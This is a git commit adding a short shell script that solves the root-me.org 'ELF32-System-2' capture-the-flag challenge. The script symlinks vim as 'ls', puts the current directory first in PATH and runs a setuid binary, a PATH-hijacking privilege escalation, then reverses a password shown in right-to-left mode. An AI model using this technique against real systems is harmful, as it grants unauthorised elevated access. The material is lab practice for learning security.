7b955e1effb9595d53b5fff8b271c7f77509ca79
anomen <ludek.h@gmail.com>
2015-07-08 18:27:24 +0200

    root-me.org/Web-Server/File-upload-double-extensions

---
+++ root-me.org/App-System/ELF32-System-2/run.sh
@@ -0,0 +1,13 @@
+mkdir /tmp/test2
+cd /tmp/test2
+
+ln -s `which vim` ls
+
+export PATH=".:$PATH"
+~/ch2
+
+# runs vim in right-to-left mode, password needs to be reversed
+python
+pass=''
+pass[::-1]
+
